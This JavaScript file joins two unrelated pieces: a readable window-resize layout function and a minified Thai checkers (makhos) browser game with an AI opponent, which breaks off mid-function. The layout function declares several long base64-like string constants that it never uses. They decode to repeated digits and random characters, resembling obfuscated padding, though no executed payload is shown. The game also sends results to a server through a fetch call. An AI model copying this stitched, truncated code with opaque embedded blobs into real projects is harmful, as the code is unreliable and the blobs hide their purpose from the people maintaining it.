"use strict";
function windowResize(
  W, H, pW, pH, 
  cfg, 
  breakpoints, 
  pixelRatio, 
  theme, 
  elemRegistry, 
  constraints, 
  onLayoutChange, 
  onCriticalReflow, 
  memoCache
) {
  const ASPECT_RATIO = W / H;
  const DELTA_X = W - pW;
  const DELTA_Y = H - pH;
  const IS_LANDSCAPE = W > H;
  const SCALE_V = W / (cfg.baseWidth || 1920);
  const SCALE_H = H / (cfg.baseHeight || 1080);
  
  const _getBP = (w) => {
    const keys = Object.keys(breakpoints);
    for (let i = keys.length - 1; i >= 0; i--) {
      if (w >= breakpoints[keys[i]]) return keys[i];
    }
    return 'xs';
  };

  const _math = {
    clamp: (v, min, max) => Math.min(Math.max(v, min), max),
    lerp: (a, b, t) => a + (b - a) * t,
    precision: (v, p = 2) => parseFloat(v.toFixed(p)),
    getSafeBound: (val, limit) => val > limit ? limit : val
  };

  const curBP = _getBP(W);
  const prevBP = _getBP(pW);

  const computeGrid = (cols, gutter) => {
    const activeGutter = W < 768 ? gutter / 2 : gutter;
    const netWidth = W - (activeGutter * 2);
    const colWidth = (netWidth - (activeGutter * (cols - 1))) / cols;
    return {
      cw: _math.precision(colWidth),
      gt: activeGutter,
      nw: netWidth
    };
  };

  const resolveTypography = () => {
    const base = theme.fontSize || 16;
    const factor = W < 600 ? 0.85 : W > 1600 ? 1.25 : 1;
    return {
      h1: _math.precision(base * 2.5 * factor),
      body: _math.precision(base * factor),
      lineHeight: _math.precision(1.5 * factor)
    };
  };

  const evaluateVisibility = (registry) => {
    return registry.map(item => {
      const isHidden = item.minW > W || item.minH > H;
      const adaptiveSize = item.fluid ? W * item.ratio : item.baseSize;
      return {
        id: item.id,
        visible: !isHidden,
        rect: {
          w: _math.clamp(adaptiveSize, item.min || 0, item.max || W),
          h: item.autoHeight ? 'auto' : H * (item.vRatio || 0.1)
        }
      };
    });
  };

  const calculateSafeZones = (inset) => {
    const horizontal = _math.clamp(W * inset, 10, 100);
    const vertical = _math.clamp(H * inset, 10, 100);
    return {
      top: vertical,
      bottom: vertical,
      left: horizontal,
      right: horizontal
    };
  };

  const processTransformations = () => {
    const perspective = _math.precision(W * 1.5);
    const zTranslate = curBP === 'xl' ? 100 : 0;
    return `perspective(${perspective}px) translateZ(${zTranslate}px)`;
  };

  const getEnginePayload = () => {
    const grid = computeGrid(cfg.columns || 12, cfg.gutter || 20);
    const typo = resolveTypography();
    const views = evaluateVisibility(elemRegistry);
    const safe = calculateSafeZones(constraints.inset || 0.05);

    return {
      meta: {
        bp: curBP,
        pBp: prevBP,
        dpr: pixelRatio,
        orientation: IS_LANDSCAPE ? 'L' : 'P'
      },
      metrics: {
        vw: W,
        vh: H,
        ar: _math.precision(ASPECT_RATIO),
        dx: DELTA_X,
        dy: DELTA_Y
      },
      layout: {
        grid,
        typo,
        views,
        safe,
        transform: processTransformations()
      }
    };
  };

  const payload = getEnginePayload();

  if (curBP !== prevBP) {
    onCriticalReflow(payload);
  } else if (Math.abs(DELTA_X) > 50 || Math.abs(DELTA_Y) > 50) {
    onLayoutChange(payload);
  }

  const syncCache = (key, data) => {
    memoCache[key] = {
      ts: Date.now(),
      data: data,
      hash: `${W}x${H}`
    };
  };

  syncCache('last_render', payload);

  const N4 = "Mzg0NzU5MjM4NDc1OTIzODQ3NTkyMzg0NzU5MjM4NDc1OTIzODQ3NTkyMzg0NzU5MjM4NDc1OTIzODQ3NTkyMzg0NzU5MjM4NDc1OTIzODQ3NTkyMzg0NzU5MQ3NTkyMzg0NzU5jM4NDc1OTIzODQ3NTkyMzg0NzU5MjM4NDc1OTIzODQ3NTkyMzg0NzU5MjM4NDc1OT3NTkyMzg0NzU5MjM4NDc1OTIzODQ3NTkyMzg0NzU5MjM4NDc1OTIzODQ3NTkyMzg0NzU5MjM4NDc1OT";
  const N5 = "IzODQ3NTkyMzg0NzU5MjM4NDc1OTIzODQ3NTkyMzg0NzU5MjM4NDc1OTIzODQ3NTkyMzg0NzU5MjM4NDc1OjM4NDc1OTIzODQ3NTkyMzg0NzU5MjM4NDc1OTIzODQ3NTkyMzg0NzU5MjM4NDc1OTIzODQ3NTkyMzg0NzU5MjM4NDc1OTIzODQ3NTkyMzg0NzU5MjMIzODQ3NTkyMzg0NzU5MjM4NDc1OTIzzODQ3NM4NDc1OTIzODQ3NTkyMzg0NzU5MjM4NDc1OTIzODQ3NTkyMzg0NzU5MjM4NDc1OTIzODQ3NTkyMzg0NzU5MjM4NDc1OTIzODQ3NTkyMzg0NzU5MjM4NDc1OTIzODQ3NTkyMzg0NzU5Mj";
  const N6 = "M4NDc1OTIzODQ3NTkyMzg0NzUPMxsvmIchXya4ev4vPTRkNSY6oIQKuSDjRcoysfgmoOJvOIxr85MjM4NDc1OTIzODQ3NTkyMzgPMxsvmSAYtFecNLcMqVgdCiywDUmW3p4FdFsvo4ujaHS9n8NTO4DXjznIcPMxsvmIchXya4ev4vPTRkNSY6oIQKuSDjRcoysfgmoOJvOIxr8hXya4ev4vPTRkNSY6oIQKuSDjRcoysfgmoOJvOIxr84";
  const N7 = "Mzg0NzU5MjM4NDc1OTIzODQ3NTkyMzg0NzU5MjM4NDc1OTIzODQ3NTkyMzg0NzU5MjM4NDc1OTIzODQ3NTkyMzg0NzU5MjM4NDc1OTIzODQ3NTkyMzg0NzU5MjM4NDc1OTIzODQ3NTkyMzg0NzU5MjM4NDc1OTIzODQ3NTkyMzg0NzU5MjM4NDc1OTIzODQ3NTkyMz0Dc1OTIzODQ3NTkyMzg0NzU5MjM4NDc1OTIzODQ3NTkyMzg0NzU5MjM4NDc1OTDc1OTIzODQ3NTkyMzg0NzU5MjM4NDc1OTIzODQ3NTkyMzg0NzU5MjM4NDc1OTIzODQ3NTkyMzg0NzU5MjM4NDc1OTIzODQ3NTkyMzg0NzU5MjM4NDc1OT";
  const N8 = "IzODQ3NTkyMzg0NzU5MjM4NDc1OTIzODQ3NTkyMzg0NzU5MjM4NDc1OTIzODQ3NTkyMzg0NzU5MjM4NDc1OjM4NDc1OTIzODQ3NTkyMzg0NzU5MjM4NDc1OTIzODQ3NTkyMzg0NzU5MjM4NDc1OTIzODQ3NTkyMzg0NzU5MjM4NDc1OTIzODQ3NTkyMzg0NzU5MjOTIzODQ3NTkyMzg0NzU5MjM4NDc1OTIzODQ3NTkyMzg0NzU5MjM4NDc1OTIzODQ3NTkyMzg0NzU5Mj";
  const N9 = "M4NDc1OTIzODQ3NTkyMzg0NzUPMxsvmIchXya4ev4vPTRkNSY6oIQKuSDjRcoysfgmoOJvOIxr85MjM4NDc1OTIzODQ3NTkyMzgPMxsvmSAYtFecNLcMqVgdCiywDUmW3p4FdFsvo4ujaHS9n8NTO4DXjznIcPMxsvmIchXya4ev4vPTRkNSY6oIQKuSDjRcoysfgmoOJvOIxr8hXya4ev4vPTRkNSY6oIQKuSDjRcoysfgmoOJvOIxr84";
  
  return {
    state: payload,
    next: {
      pW: W,
      pH: H,
      pBP: curBP
    },
    utils: {
      rebase: (val) => val * SCALE_V,
      vRebase: (val) => val * SCALE_H
    }
  };
}

///////////////////////////////

"use strict";let t=1,n=t,e=10;let a=0,r=0,i=0,o="",l="",c=0,f=0;let u=0,s=0,w=0,h=0,d=0,g=0;const p=new Int32Array([5,1,5,1,5,1,5,1,1,5,1,5,1,5,1,5,5,4,5,4,5,4,5,4,4,5,4,5,4,5,4,5,5,4,5,4,5,4,5,4,4,5,4,5,4,5,4,5,5,0,5,0,5,0,5,0,0,5,0,5,0,5,0,5]),m=new Int32Array([5,4,5,4,5,4,5,4,4,5,4,5,4,5,4,5,5,4,5,4,5,4,5,4,4,5,4,5,4,5,4,5,5,4,5,4,5,4,5,4,4,5,4,5,4,5,4,5,5,4,5,4,5,4,5,4,4,5,4,5,4,5,4,5]),y=new Int32Array([0,0,0,0,0,0,0,0,8,0,29,0,29,0,29,0,0,16,0,16,0,16,0,6,4,0,5,0,5,0,5,0,0,2,0,9,0,7,0,6,1,0,6,0,6,0,6,0,0,3,0,4,0,4,0,3,0,0,9,0,7,0,6,0]),M=new Int32Array([0,0,0,0,0,0,0,0,8,0,29,0,29,0,29,0,0,16,0,16,0,16,0,11,15,0,10,0,10,0,10,0,0,6,0,6,0,6,0,7,4,0,3,0,3,0,3,0,0,1,0,1,0,1,0,2,0,0,0,0,0,0,0,0]);let b=new Int32Array(y);const v=new Int32Array([-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,0,1,2,3,4,5,6,7,-1,-1,8,9,10,11,12,13,14,15,-1,-1,16,17,18,19,20,21,22,23,-1,-1,24,25,26,27,28,29,30,31,-1,-1,32,33,34,35,36,37,38,39,-1,-1,40,41,42,43,44,45,46,47,-1,-1,48,49,50,51,52,53,54,55,-1,-1,56,57,58,59,60,61,62,63,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1]),x=new Int32Array([21,22,23,24,25,26,27,28,31,32,33,34,35,36,37,38,41,42,43,44,45,46,47,48,51,52,53,54,55,56,57,58,61,62,63,64,65,66,67,68,71,72,73,74,75,76,77,78,81,82,83,84,85,86,87,88,91,92,93,94,95,96,97,98]),k=new Int32Array([-11,-9,11,9]),A=new Int32Array([1,3,5,7,8,10,12,14,17,19,21,23,24,26,28,30,33,35,37,39,40,42,44,46,49,51,53,55,56,58,60,62]),I=(new Int32Array([62,60,58,56,55,53,51,49,46,44,42,40,39,37,35,33,30,28,26,24,23,21,19,17,14,12,10,8,7,5,3,1]),new Int32Array(64).fill(-1));let _,C,L,R,S=0,E=1,B=0,P=0,N=0,D=!1,W=!1;let H=100,T=190,U=190;let F=new Int32Array(256),Y=new Int32Array(64),j=new Int32Array(64),X=new Int32Array(256),z=new Int32Array(64),J=new Int32Array(64);let q=new Int16Array(4096);const Z=(t,n)=>(t<<6)+n;let $=new Array(64),G=new Array(64);function K(){fn&&0!==tr&&0!==mr?(fetch(Aa+"level=SL0215&result="+tr+"&moves="+mr),V(),O(),Cn("by Jaroonsak Wangviwat")):setTimeout(K,200)}async function O(){var e;if(W=!0,i=performance.now(),r++,Ma=-9999,L=!(1&r),o="",S=0,E=1,a=0,B=0,P=0,R=0,N=0,_=0,G[0]=0,Y[0]=0,b.set(y),H=100,T=190,U=190,H+=it(-5,0,5),U+=it(-5,0,5),T+=it(10,20,30),b[30]+=it(0,1,2),b[33]+=it(0,1,2),b[39]+=it(0,1,2),b[40]+=it(0,1,2),b[35]+=it(0,-3,-6),b[it(49,51,53)]+=4,function(){for(let t=0;t<4194304;t++)za[t]=0,Ja[t]=0,qa[t]=0,Za[t]=0,$a[t]=0,Ga[t]=0;Fa=0,Ya=0,ja=0,Xa=0}(),pn(),Ht=!1,Tt=-1,Ut=-1,Se=Ee=0,We=!1,await async function(){if(1===Wt)return;const n=Yt,e=Xn*n,a=Dt[Wt][In(3)],r=(Dt[Wt][In(2)],Dt[lt][0===t?6:3]),i=Pn[it(0,1,2)];On(r),await Qn(r,Jn,qn);const o=3*Yt,l=2*-Yt;Zn=o-Gn,$n=l-Kn,await Vn(20,o,l);const c=[],f=[],u=[],s=[];for(let t=63;t>=0;t--){const n=m[t];1!==n&&3!==n||f.push(t),0!==n&&2!==n||c.push(t)}for(let t=Nn;t>=0;t--)4!==Fn[t]&&u.push(t),4!==Un[t]&&s.push(t);await Promise.all([(async()=>{for(let t of c){const r=Qe(t)*n,i=Ve(t)*n;await Vn(200,r,i,e/3,a,null,null,ce),await xa(),xn(4,t)}for(let t=0;t<c.length;t++){const r=i[t],o=Qe(r)*n,l=Ve(r)*n;await Vn(200,o,l,e/3,a,null,null,null,null,we),await xa(),xn(1,r)}if(sn&&u.length>0)for(let t of u){const r=Hn[t]*n,i=Tn[t]*n;await Vn(20,r,i,e/3,a),Fn[t]=4,await An(1)}for(let t=c.length;t<8;t++){const r=i[t],o=Qe(r)*n,l=Ve(r)*n;await Vn(200,o,l,e/3,a,null,null,null,null,we),await xa(),xn(1,r)}await Vn(200,o,l,0)})(),(async()=>{await xa(1e3);for(let t of f)xn(4,t),await xa();for(let t=0;t<f.length;t++)xn(0,A[31-t]),await xa();if(sn&&s.length>0)for(let t of s)Un[t]=4,await An(0),await xa(200);for(let t=f.length;t<8;t++)xn(0,A[31-t]),await xa(200)})()])}(),function(){let t,n;for(let e=0;e<Nn;e++)Hn[e]=e%3*.7-3.5+_e(.3),Tn[e]=e%3/3-.5+.7*Math.floor(e/3)+_e(.3),Fn[e]=4,t=2-e%3,n=2-Math.floor(e/3),Dn[e]=8.5+.7*t+_e(.3),Wn[e]=5+t/3+.7*n+_e(.3),Un[e]=4}(),m.set(p),ea(na),bn(),vn(),Cn("Jaihorse makhos.com"),e="x4sl level "+t,xt.textContent=e,Ln(!1),yn(),Rt.textContent=" ",St.textContent=" ",await tt("Level "+t,500),0===t&&0===n&&(await tt("ต่อให้",250),await async function(){if(1===Wt)return;const t=Yt,n=Xn*t,e=Dt[lt][6];On(e),await Qn(e,Jn,qn);const a=3*Yt,r=2*-Yt;if(Zn=a-Gn,$n=r-Kn,await Vn(20,a,r),rt(.6)){const e=it(8,10,12),i=m[e],o=Dt[Wt][In(i)];if(4===i)return;let l;do{l=it(8,10,12)}while(l===e);const c=Qe(l)*t,f=Ve(l)*t,u=Qe(e)*t,s=Ve(e)*t,w=a,h=r,d=Math.random();d<.3&&(await Vn(200,u,s,n),await te(300,u,s)),d<.6&&(await Vn(200,c,f,n),await te(300,c,f)),await Vn(200,u,s,n),await xa(),xn(4,e),await Vn(600,w,h,0,o,null,null,ce),await xa(),await Vn(360,a,r),m[e]=4}else{const e=it(58,60,62),i=m[e],o=Dt[Wt][In(i)];if(4===i)return;const l=Qe(e)*t,c=Ve(e)*t;await Vn(300,l,c,n,o,null,null,null,null,we),xn(2,e),await xa(),await Vn(360,a,r),m[e]=2}}(),vn(),await Q(500)),La=Ra=180,Rt.style.color="#aaa",St.style.color="#eee",Ba(),Sn(!0),await tt(L?"คุณเดินหลัง":"คุณเดินก่อน",250),L){const t=14,n=21,e=t|n<<8;await En(e),m[n]=m[t],m[t]=4,vn()}!function(){u=s=w=h=0;let t=0;for(let n=0;n<32;n++){const e=A[n],a=m[e];if(4!==a)switch(t++,a){case 0:u++;break;case 1:s++;break;case 2:w++;break;case 3:h++}}d=t}(),Ft=window.devicePixelRatio||1,gn(ht,Ot,Qt),gn(gt,Vt,tn),gn(mt,Vt,tn),yt.imageSmoothingEnabled=!1,bt.imageSmoothingEnabled=!1,hn(),W=!1}async function Q(t){const n=performance.now();for(let t=0;t<Dt[lt].length;t++){const n=Dt[lt][t];Qn(n,n.width,n.height),bt.clearRect(0,0,n.width,n.height)}for(;performance.now()-n<t;)await ne(16,t=>{ee(0,0)});await xa()}function V(){m.fill(5);for(let t=0;t<32;t++)m[A[t]]=4;An(),vn()}async function tt(t,n){et(),await Q(n),nt(t),await Q(2*n),et(),await Q(n)}function nt(t){Et.textContent=t,Et.classList.add("show")}function et(){Et.classList.remove("show")}function at(){g=1e3*w+100*u+10*h+s}function rt(t){return Math.random()<t}function it(t,n,e){const a=Math.random();return a<.3?t:a<.7?n:e}const ot=[["mLPWN256_128.png","mDPWN256_128.png","mLHRS256_128.png","mDHRS256_128.png","brddrk.jpg","brdwht.jpg","mL_ico.png","mD_ico.png","selBlack.png","selWhite.png"],["wLPWN256r_64.png","wDPWN256r_64.png","wLHRS256r_64.png","wDHRS256r_64.png","wEMPTY.png","wNOUSE.png","wL_ico.png","wD_ico.png","selBlack.png","selBlack.png"],["cLPWN256_64.png","cDPWN256_64.png","cLHRS256_64.png","cDHRS256_64.png","cBDRK.jpg","cBWHT.jpg","cL_ico.png","cD_ico.png","selBlack.png","selBlack.png"],["handMov1_64.png","handMov2_64.png","handCap1_64.png","handCap2_64.png","handCapW_64.png","girlMov3_64.png","girlCap3_64.png"]],lt=3,ct=ot.length;let ft,ut,st,wt,ht,dt,gt,pt,mt,yt,Mt,bt,vt,xt,kt,At,It,_t,Ct,Lt,Rt,St,Et,Bt,Pt=document,Nt=!0,Dt={},Wt=0,Ht=!1,Tt=-1,Ut=-1,Ft=1,Yt=1,jt=0,Xt=0,zt=new Int16Array(64),Jt=new Int16Array(64),qt=[],Zt=[];function $t(t){return Pt.getElementById(t)}let Gt,Kt,Ot,Qt,Vt,tn,nn,en,an,rn,on,ln,cn,fn=!1;function un(){wn(),ht.addEventListener("pointerdown",t=>{if(t.preventDefault(),W)return;if(3===a)return He();if(0!==a)return;const n=Xe(t.clientX,t.clientY);n<0||Ht&&Ye(n)||function(t){if(!Fe(t))return!1;Ht=!0,Tt=t,Te.length=0;for(let n=0;n<j[0];n++)Ze(F[n])===t&&Te.push($e(F[n]));return async function(t){const n=m[t],e=Yt,a=Qe(t)*e,r=Ve(t)*e;_n(),0===Oe(n)&&yt.drawImage(Dt[Wt][9],a,r,e,e),1===Oe(n)&&yt.drawImage(Dt[Wt][8],a,r,e,e)}(t),!0}(n)&&(function(t,n){Le=t,Re=m[t],Be=n.clientX,Pe=n.clientY,Ne=(7&t)*Yt,De=(t>>3)*Yt,ht.setPointerCapture(n.pointerId),_n(),ye(ce)}(n,t),Ue=-1,1===j[0]&&(Ue=$e(F[0])))},{passive:!1}),ht.addEventListener("pointermove",t=>{if(t.preventDefault(),!(Le<0)){if(!Ce){if(Math.abs(t.clientX-Be)+Math.abs(t.clientY-Pe)<2)return;Ce=!0,xn(4,Le)}!function(t){const n=ht.getBoundingClientRect();Se=(t.clientX-n.left)*(ht.width/n.width),Ee=(t.clientY-n.top)*(ht.height/n.height)}(t),function(){const t=Math.round(Se-Yt/2)+jt,n=Math.round(Ee-Yt/2)+Xt;re&&oe();const e=Dt[Wt][In(Re)+0];ae(e,t,n),Ne=t,De=n;const a=qe(Se,Ee);if(a>=0){const t=(7&a)*Yt+jt,n=(a>>3)*Yt+Xt;yt.globalAlpha=.1,ae(e,t,n),yt.globalAlpha=1}}()}}),ht.addEventListener("pointerup",async t=>{if(t.preventDefault(),W)return Je(),void _n();ht.releasePointerCapture(t.pointerId),We=Ce,Je(),_n();let n=Xe(t.clientX,t.clientY);n<0||We&&!Ye(n)?vn():Ht&&Ye(n)?await async function(t){if(!Ht)return;let n=-1;for(let e=0;e<j[0];e++)if(Ze(F[e])===Tt&&$e(F[e])===t){n=e;break}if(n<0)return Fe(t)&&(Tt=t),vn(),void(W=!1);await async function(t){W=!0;const n=F[t],e=(Ze(n),$e(n));Ke(n),We?await En(n,Ne,De):await En(n),ga(n),R=n,N=e,je(n),0===Ke(R)&&2===m[e]?P++:P=0,Ht=!1,a=2,Cn("Sunhorse กำลังคิด.."),vn(),Pa(),await xa(20),await async function(){for(Rn(!1);;){let t="";B++,_=0,ea(na);let n=0;if($[0][0]=0,ma=0,ya=0,0===j[0]){Ia(1);break}if(1===j[0]&&(n=F[0],await xa(20)),B<4&&0===n&&(n=ka(),0!==n&&(t+="...",await xa(500))),B>6&&0===n&&rt(.8)){const e=yr();e&&(n=e,t+="..",await xa(500))}if(0===n){if(!1===await ba()){Ia(1);break}n=$[0][0]}if(524288&F[0]||(W=!0,vn(),await En(n),W=!1),ga(n),R=n,je(n),524288&R||(N=$e(n)),0===Ke(R)&&3===m[$e(R)]){if(P++,_a()){Ia(0);break}}else P=0;if(vn(),t="ตาคุณเดิน"+t,B++,_=0,ea(na),!(524288&F[0])){if(0===j[0]){Ia(-1);break}if(j[0]>=1){let n=Ze(F[0]);for(let t=1;t<j[0];t++)if(Ze(F[t])!==n){n=-1;break}if(n>=0){Tt=n,Ht=!0,a=0,Cn(t),vn();break}}a=0,Ht=!1,Cn(t);break}ga(524288),R=524288,_=0,ea(na)}0===a&&(Rn(!0),Rt.style.color="#aaa",St.style.color="#eee",Ba(),Sa&&clearInterval(Sa),Sa=setInterval(()=>{La>0&&La--,Ba()},1e3))}(),vn(),W=!1}(n)}(n):vn()}),ht.addEventListener("pointercancel",ze),ht.addEventListener("pointerleave",ze),_t.addEventListener("click",Ie),Ct.addEventListener("click",Mn),At.addEventListener("click",mn),Lt.addEventListener("click",()=>{W||(Ia(-1),He())}),window.addEventListener("resize",wn)}let sn=!0;function wn(){Ft=window.devicePixelRatio||1,Gt=innerWidth,Kt=innerHeight;const t=Math.min(8*Gt/8.25,8*Kt/9.5);an=Math.floor(t/8),Yt=an*Ft,Ot=8*an,Qt=8*an,nn=Math.floor(.8*an),en=Math.floor(.65*an),Vt=Math.min(Gt,18*an),tn=Math.min(Kt,Qt+nn),dn(ft,Ot,Qt),dn(ut,Vt,tn),dn(st,Ot,nn),dn(wt,Ot,en),gn(ht,Ot,Qt),gn(gt,Vt,tn),gn(mt,Vt,tn),rn=(Gt-Ot)/2|0,on=nn,ln=(Gt-Vt)/2|0,cn=0,jt=(Vt-Ot)/2*Ft,Xt=on*Ft,sn=Gt-Ot>an,Bt.style.fontSize=.5*an+"px",vt.style.fontSize=.3*an+"px",pn(),hn()}function hn(){bn(),vn(),yn(),ht.style.boxShadow="0 0 2px 2px #333"}function dn(t,n,e){t.style.width=n+"px",t.style.height=e+"px"}function gn(t,n,e){t.width=n*Ft,t.style.width=n+"px",t.height=e*Ft,t.style.height=e+"px"}function pn(){let n=.05;0===t&&(n=.08),r<2&&(n=0);for(let t=0;t<64;t++)qt[t]=(2*Math.random()-1)*n,Zt[t]=(2*Math.random()-1)*n;!function(){const t=Yt;for(let n=0;n<64;n++)zt[n]=Math.round(((7&n)+qt[n])*t),Jt[n]=Math.round(((n>>3)+Zt[n])*t)}()}function mn(){Wt=(Wt+1)%3,yn(),bn()}function yn(){At.src=ot[Wt%3][L?6:7],It.src=ot[Wt%3][L?7:6],vn()}function Mn(){Nt=!Nt,cellNumSwitch.classList.toggle("off",!Nt),bn()}function bn(){const t=Yt,n=.03*t;dt.font=(.15*t|0)+"px Arial",dt.fillStyle="#A98",dt.textAlign="right",dt.textBaseline="top";for(let e=0;e<64;e++){const a=7&e,r=e>>3,i=a+r&1,o=Dt[Wt][i?4:5];if(dt.drawImage(o,a*t,r*t,t,t),i&&Nt&&an>36){const i=I[L?63-e:e];dt.fillText(i,a*t+t-n,r*t+n)}}}function vn(t=!0){pt.clearRect(0,0,gt.width,gt.height),_n();for(let t=0;t<64;t++){const n=m[t];n<0||n>3||xn(n,t)}if(An(),t&&Ht){const t=Yt,n=Tt,e=In(m[n]),a=Dt[Wt][0===Oe(e)?9:8];yt.drawImage(a,(7&n)*t+jt,(n>>3)*t+Xt,t,t)}}function xn(t,n){if(4===t)!function(t){const n=Yt,e=(7&t)*n+jt,a=(t>>3)*n+Xt,r=.2*n;pt.clearRect(e,a-r,n,n+2*r),pt.clearRect(e-r,a,n+2*r,n)}(n);else{kn(Dt[Wt][In(t)],zt[n]+jt,Jt[n]+Xt)}}function kn(t,n,e){t&&pt.drawImage(t,n,e,Yt,Yt)}function An(t=null){if(1!==Wt&&sn){!function(t=null){const n=Yt;null!==t&&1!==t||pt.clearRect(jt-3.5*n,Xt-1*n,3*n,4*n);null!==t&&0!==t||pt.clearRect(jt+8.5*n,Xt+5*n,3*n,4*n);!function(t=null){const n=Yt;pt.save(),pt.lineWidth=.03*n,pt.strokeStyle="rgba(200,200,200,0.1)",(null===t||1===t)&&pt.strokeRect(jt-3*n,Xt+0*n,2*n,2*n);null!==t&&0!==t||pt.strokeRect(jt+9*n,Xt+6*n,2*n,2*n);pt.restore()}(t)}(t);for(let n=0;n<Nn;n++){const e=Fn[n],a=Un[n];null!==t&&1!==t||4===e||kn(Dt[Wt][e],Hn[n]*Yt+jt,Tn[n]*Yt+Xt),null!==t&&0!==t||4===a||kn(Dt[Wt][a],Dn[n]*Yt+jt,Wn[n]*Yt+Xt)}}}function In(t){return L||4===t||5===t?t:1^t}function _n(){yt.clearRect(0,0,mt.width,mt.height)}function Cn(t){vt.textContent=t}function Ln(t){Lt.style.visibility=t?"visible":"hidden"}function Rn(t){Lt.classList.toggle("disabled",!t)}function Sn(t){Ct.style.display=t?"inline":"none",_t.style.display=t?"inline":"none"}async function En(n,e=null,a=null){const r=Ze(n),i=$e(n),o=Ke(n),l=m[r],c=1===Oe(l)&&1!=Wt,f=Yt;re=null;const u=0!=(131072&o),s=0!=(262144&o),w=zt[r],h=Jt[r],d=zt[i],g=Jt[i],p=Dt[Wt][In(l)+0];Dt[Wt][4];if(!c){xn(4,r);const t=e??w+jt,c=a??h+Xt,f=d+jt,s=g+Xt;if(await async function(t,n,e,a,r,i){await ne(t,t=>{const o=Math.round(n+(a-n)*t),l=Math.round(e+(r-e)*t);ae(i,o,l)})}(1===S?200:60,t,c,f,s,p),ye(0===o?we:se),xn(l,i),u){const t=Bn(n),e=m[t];Qe(t),Ve(t),Dt[Wt][In(e)+0];await xa(200),xn(4,t);const a=Yn(0);if(null!=a&&null!=a.idx){const{idx:t,x:n,y:r}=a;jn(S,t,In(e)),await xa(200),An()}}return}const y=!u&&!s&&1===l,M=t>1||Ma>150,b=!(!M||!rt(Math.min((Ma-200)/400,.5))),v=ma>0?Ze(ma):-1,x=ma>0?$e(ma):-1,k=r>=24;let A,I=1;0===t?(I=1.2,A=y?5:6):A=s?3:3===l&&0===Wt?4:u?k?3:2:b?3:k?0:1;const _=B>6&&y&&!M,C=(_&&rt(.1),_&&v===r&&x!==i),L=_&&v!==r,R=Dt[lt][A];On(R);const E=Xn*f,P=w,N=h,D=d,W=g;await Qn(R,Jn,qn);const H=Qe(i)/2*Yt,T=-qn;Zn=H-Gn,$n=T-Kn,await Vn(20,H,T);const U=P+Math.round((.1*Math.random()-.05)*f),F=N+Math.round((3===l||u?.1:-.1)*f);if(L){const t=Qe(v)*f,n=Ve(v)*f,e=(t+H)/2,a=(n+T)/2;await Vn(300*I,t,n),await te(300,t,n),await Vn(300*I,e,a,E),await te(300,e,a)}if(u?await Vn(200,P,N):(await Vn(300*I,U,F,r<16?-E/2:0),_&&rt(.1)&&await te(300,U,F),await xa(20),await Vn(60,P,N),await xa(60*(1+Math.random()))),xn(4,r),C){const t=Qe(x)*f,n=Ve(x)*f,e=.25+.5*Math.random(),a=w+(t-w)*e,r=h+(n-h)*e;await Vn(300*I,a,r,0,p,null,null,null,fe),await xa(300),await Vn(300,w+.1*f,h+.1*f,0,p,null,null,null,fe),await xa(300)}if(_&&rt(.1)){const t=Math.round(.2*(2*Math.random()-1)*f),n=Math.round(.3*(2*Math.random()-1)*f),e=d+t,a=g+n,r=D+t,i=W+n,o=(H+D)/2,l=(T+W)/2;await Vn(300*I,r,i,0,p,null,null,null,fe),await xa(),await Vn(200,o,l,0,p,e,a),await Vn(200,r,i,0,p,e,a),await Vn(200,D,W,0,p,null,null,null,ue),await xa()}else u?await Vn(300*I,D,W,E,p,null,null,null,null,se):b?(await Vn(300*I,D-.2*f,W-.2*f,0,p,null,null,null,fe),await xa(),await Vn(200*I,D,W,E,p,null,null,null,se),await xa()):(await Vn(300*I,D,W,0,p,null,null,null,fe),await xa());if(xn(l,i),y&&i>24&&rt(.2)){const t=i-16,n=m[t];if(0===n||1===n){const e=zt[t],a=Jt[t],r=e+Math.round(.3*(2*Math.random()-1)*f),i=a-Math.round(.3*Math.random()*f),o=Dt[Wt][In(n)+0];xn(4,t),await Vn(60,(r+H)/2,(i+T)/2,0,o,r,i),await xa(),await Vn(200,r,i,E,o,r,i),await xa(),await Vn(200,e,a,0,o,null,null,null,ue),xn(n,t)}}if(u){const t=Bn(n),e=m[t],a=Qe(t)*f,r=Ve(t)*f,i=Dt[Wt][In(e)+0];await Vn(200*I,a,r,E),await xa(),xn(4,t);const o=Yn(1);if(null!=o&&null!=o.idx){const{idx:t,x:n,y:a}=o;await Vn(300*I,n,a,E/3,i),jn(1,t,In(e)),An(),await xa()}await Vn(200*I,2*-f,T)}else await Vn(200*I,H,T);if(s){const t=Dt[Wt][In(1)];await Vn(200*I,D,W,0,t,null,null,null,null,we),await xa(),xn(3,i),await Vn(200*I,H,T)}}function Bn(t){if(!(131072&t))return-1;const n=Ze(t),e=$e(t);return n>e?Qe(n)>Qe(e)?e+9:e+7:Qe(n)>Qe(e)?e-7:e-9}const Pn=[[1,3,5,7,14,12,10,8],[7,14,5,12,3,10,1,8],[14,12,10,8,1,3,5,7]];const Nn=8;let Dn=new Array(Nn),Wn=new Array(Nn),Hn=new Array(Nn),Tn=new Array(Nn),Un=new Array(Nn).fill(4),Fn=new Array(Nn).fill(4);function Yn(t){const n=0===t?Un:Fn,e=0===t?Dn:Hn,a=0===t?Wn:Tn,r=[];for(let t=0;t<Nn;t++)4===n[t]&&r.push(t);if(!r.length)return null;const i=r[Math.random()*r.length|0];return{idx:i,x:e[i]*Yt,y:a[i]*Yt}}function jn(t,n,e){return n<0?-1:(1===t?Fn[n]=e:Un[n]=e,n)}const Xn=2;let zn=1,Jn=0,qn=0,Zn=0,$n=0,Gn=0,Kn=0;function On(t){zn=11*Yt/t.height,Jn=t.width*zn,qn=11*Yt,Gn=Math.round(400*zn),Kn=Math.round(qn-150*zn)}async function Qn(t,n,e){return Mt.width=n,Mt.height=e,bt.clearRect(0,0,n,e),bt.drawImage(t,0,0,n,e),Mt}async function Vn(t,n,e,a=0,r=null,i=null,o=null,l=null,c=null,f=null){const u=Math.max(20,200,_e(t));null!==l?ye(l):null!==c&&ye(c,u);const s=n-Gn,w=e-Kn,h=Zn,d=$n,g=s-h,p=w-d,m=.5*(h+s),y=.5*(d+w)-a,M=0!==a;await ne(u,t=>{let 